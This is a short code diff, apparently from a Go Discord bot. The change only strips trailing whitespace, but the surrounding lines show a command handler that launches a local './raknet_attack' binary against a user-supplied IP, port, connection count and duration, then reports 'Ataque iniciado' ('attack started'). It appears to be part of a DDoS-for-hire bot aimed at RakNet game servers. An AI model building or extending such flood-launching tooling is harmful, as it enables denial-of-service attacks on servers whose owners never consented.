@@ -106,7 +106,7 @@ func handleRaknetCommand(s *discordgo.Session, m *discordgo.MessageCreate, args 
 
 	go func() {
 		cmd := exec.Command("./raknet_attack", ip, port, connections, timeSeconds)
-		
+
 		err := cmd.Start()
 		if err != nil {
 			s.ChannelMessageSend(m.ChannelID, "Error raknet.go")
@@ -121,7 +121,7 @@ func handleRaknetCommand(s *discordgo.Session, m *discordgo.MessageCreate, args 
 		s.ChannelMessageSend(m.ChannelID, "Ataque iniciado")
 
 		err = cmd.Wait()
-		
+
 		processMutex.Lock()
 		isRunning = false
 		attackProcess = nil
